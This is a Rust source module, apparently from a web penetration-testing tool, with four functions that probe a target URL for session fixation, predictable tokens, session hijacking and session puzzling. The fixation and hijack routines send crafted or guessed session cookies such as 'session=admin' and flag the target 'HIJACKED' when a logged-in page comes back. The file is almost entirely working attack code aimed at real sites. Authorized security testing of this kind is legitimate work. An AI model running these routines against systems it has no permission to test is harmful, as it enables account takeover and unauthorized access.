use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn fixation(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Session Fixation Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let resp = client.get(url).send().await?;
    let set_cookie = resp.headers().get("set-cookie").map(|v| v.to_str().unwrap_or("").to_string()).unwrap_or_default();
    println!("  Initial Set-Cookie: {}", if set_cookie.is_empty() { "(none)" } else { &set_cookie });

    let fixated_ids = ["ATTACKER_SESSION_001", "FIXATED_12345", "admin", "test", "1"];

    for sid in &fixated_ids {
        let cookie_val = format!("PHPSESSID={}; JSESSIONID={}; session={}; sid={}", sid, sid, sid, sid);
        match client.get(url).header("Cookie", &cookie_val).send().await {
            Ok(r) => {
                let resp_cookie = r.headers().get("set-cookie").map(|v| v.to_str().unwrap_or("")).unwrap_or("");
                if resp_cookie.contains(sid) {
                    println!("  {} Session {:25} — ACCEPTED (no rotation)", "[!]".red().bold(), sid);
                } else if !resp_cookie.is_empty() {
                    println!("  {} Session {:25} — rotated (secure)", "[+]".green().bold(), sid);
                } else {
                    println!("  {} Session {:25} — no cookie set", "[-]".dimmed(), sid);
                }
            }
            Err(_) => println!("  {} Session {:25} — error", "[-]".dimmed(), sid),
        }
    }

    Ok(())
}

pub async fn predict(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Session Token Prediction", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut tokens: Vec<String> = vec![];

    for i in 0..5 {
        if let Ok(r) = client.get(url).send().await {
            if let Some(cookie) = r.headers().get("set-cookie") {
                let cookie_str = cookie.to_str().unwrap_or("");
                if let Some(start) = cookie_str.find('=') {
                    let end = cookie_str[start+1..].find(';').map(|e| start + 1 + e).unwrap_or(cookie_str.len());
                    let token = &cookie_str[start+1..end];
                    tokens.push(token.to_string());
                    println!("  {} Token {}: {}... (len={})", "*".cyan(), i, &token[..token.len().min(20)], token.len());
                }
            }
        }
    }

    if tokens.len() >= 2 {
        let all_same = tokens.windows(2).all(|w| w[0] == w[1]);
        if all_same {
            println!("\n  {} All tokens identical — no rotation!", "[!]".red().bold());
        }
        let len = tokens[0].len();
        let all_same_len = tokens.iter().all(|t| t.len() == len);
        if all_same_len && len < 16 {
            println!("  {} Short token length ({}) — predictable", "[!]".red().bold(), len);
        }
    }

    Ok(())
}

pub async fn hijack(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Session Hijacking Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let hijack_cookies = [
        ("Weak session", "session=1"),
        ("Sequential", "PHPSESSID=100"),
        ("Predictable", "JSESSIONID=abc123"),
        ("Empty session", "session="),
        ("Null session", "session=null"),
        ("Admin guess", "session=admin"),
        ("Default", "session=DEFAULT"),
        ("Test token", "session=test"),
    ];

    for (name, cookie) in &hijack_cookies {
        match client.get(url).header("Cookie", *cookie).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("welcome") || text.contains("dashboard") || text.contains("admin")) {
                    println!("  {} {:20} — HIJACKED", "[!]".red().bold(), name);
                } else if status == 200 {
                    println!("  {} {:20} — accessible", "[+]".green().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn puzzle(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Session Puzzle Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let mut sessions: Vec<(String, String)> = vec![];

    for i in 0..10 {
        if let Ok(r) = client.get(url).send().await {
            let set_cookie = r.headers().get("set-cookie").map(|v| v.to_str().unwrap_or("").to_string()).unwrap_or_default();
            let body = r.text().await.unwrap_or_default();
            let user_match = body.contains("user") || body.contains("User");
            sessions.push((set_cookie.clone(), if user_match { "user data" } else { "no user data" }.to_string()));
            println!("  {} Session {}: cookie={}...", "*".cyan(), i, &set_cookie[..set_cookie.len().min(30)]);
        }
    }

    let unique_cookies: Vec<&String> = sessions.iter().map(|(c, _)| c).collect();
    let unique_count = unique_cookies.iter().collect::<std::collections::HashSet<_>>().len();
    println!("\n  {} {} unique sessions out of {} requests", "[*]".cyan().bold(), unique_count, sessions.len());
    if unique_count < 3 {
        println!("  {} Low session diversity — puzzle attack viable", "[!]".red().bold());
    }

    Ok(())
}
